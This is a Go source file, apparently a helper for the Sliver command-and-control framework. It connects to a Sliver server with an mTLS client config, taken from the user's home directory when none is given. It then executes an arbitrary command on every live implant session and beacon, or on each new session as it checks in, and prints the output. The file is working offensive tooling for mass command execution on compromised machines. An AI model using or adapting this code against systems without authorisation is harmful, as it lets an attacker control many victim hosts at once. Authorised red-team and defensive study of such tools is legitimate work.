package main

import (
	"context"
	"flag"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/bishopfox/sliver/client/assets"
	consts "github.com/bishopfox/sliver/client/constants"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

func makeRequest(session *clientpb.Session) *commonpb.Request {
	if session == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		SessionID: session.ID,
		Timeout:   timeout,
	}
}
func makeBeaconRequest(beacon *clientpb.Beacon) *commonpb.Request {
	if beacon == nil {
		return nil
	}
	timeout := int64(60)
	return &commonpb.Request{
		BeaconID: beacon.ID,
		Timeout:  timeout,
		Async:    true,
	}
}
func main() {
	var configPath string
	var command string
	var runonnew bool
	var argss string
	flag.StringVar(&configPath, "config", "", "path to sliver client config file")
	flag.StringVar(&command, "command", "", "command to run")
	flag.StringVar(&argss, "args", "", "command args")
	flag.BoolVar(&runonnew, "runonnew", false, "weather or not to run on all new agents, hangs by default")
	flag.Parse()
	var args []string
	args = strings.Split(argss, "^")
	if configPath == "" {
		println("no config is provided --config would work, but attempting to guess based on whats in ~/.sliver-client/configs/")
		files, err := ioutil.ReadDir(os.Getenv("HOME") + "/.sliver-client/configs/")
		if err != nil {
			log.Fatal(err)
		}
		configPath = os.Getenv("HOME") + "/.sliver-client/configs/" + files[0].Name()

	}
	// load the client configuration from the filesystem
	config, err := assets.ReadConfig(configPath)
	if err != nil {
		log.Fatal(err)
	}

	// connect to the server
	rpc, ln, err := transport.MTLSConnect(config)
	if err != nil {
		log.Fatal(err)
	}
	log.Println("[*] Connected to sliver server")
	defer ln.Close()
	//command = "ls"
	if runonnew != true {
		runcommandonall(rpc, command, args)
	} else {
		runcommandonnew(rpc, command, args)
	}

}
func runcommandonall(rpc rpcpb.SliverRPCClient, command string, args []string) {
	agents, err := rpc.GetSessions(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	//print(agents)
	for i := 0; i < len(agents.Sessions); i++ {
		//print(&agents.Sessions[i])
		if agents.Sessions[i].IsDead == true {
			println(agents.Sessions[i].Hostname + " is dead")
		} else {
			//println(i)
			runcommandon(rpc, command, agents.Sessions[i], args)
		}
	}
	beacons, err := rpc.GetBeacons(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}
	for i := 0; i < len(beacons.Beacons); i++ {
		//print(&agents.Sessions[i])
		if beacons.Beacons[i].IsDead == true {
			println(beacons.Beacons[i].Hostname + " is dead")
		} else {
			//println(i)
			runcommandonbeacon(rpc, command, beacons.Beacons[i], args)
		}
	}
}

func runcommandonbeacon(rpc rpcpb.SliverRPCClient, command string, agent *clientpb.Beacon, args []string) {

	// sess, err := rpc.OpenSession(context.Background(), &sliverpb.OpenSession{
	// 	Request: makeBeaconRequest(agent),
	// 	C2S:     []string{},
	// })
	// print(sess)
	// if err != nil {
	// 	log.Print(err)
	// 	return
	// }
	resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Path: command,
		//Output:  true,
		Request: makeBeaconRequest(agent),
	})
	if err != nil {
		log.Print(err)
		return
	}
	println(agent.Hostname)
	println(string(resp.Stdout) + string(resp.Stderr))

}
func runcommandon(rpc rpcpb.SliverRPCClient, command string, agent *clientpb.Session, args []string) {
	resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
		Path:    command,
		Output:  true,
		Request: makeRequest(agent),
		Args:    args,
	})
	if err != nil {
		log.Print(err)
		return
	}
	println(agent.Hostname)
	println(string(resp.Stdout) + string(resp.Stderr))
}
func runcommandonnew(rpc rpcpb.SliverRPCClient, command string, args []string) {
	// Open the event stream to be able to collect all events sent by  the server
	eventStream, err := rpc.Events(context.Background(), &commonpb.Empty{})
	if err != nil {
		log.Fatal(err)
	}

	// infinite loop
	for {
		event, err := eventStream.Recv()
		if err == io.EOF || event == nil {
			return
		}
		// Trigger event based on type
		switch event.EventType {

		// a new session just came in
		case consts.SessionOpenedEvent:
			session := event.Session
			// call any RPC you want, for the full list, see
			// https://github.com/BishopFox/sliver/blob/master/protobuf/rpcpb/services.proto
			runcommandon(rpc, command, session, args)
			//beacon fields not extracted so cannot impliment
			// case consts.BeaconRegisteredEvent:
			// 	beacon := event.Data
			// 	print(beacon)
			// 	runcommandonbeacon(rpc, command, clientpb.Beacon(beacon))
		}
	}
}
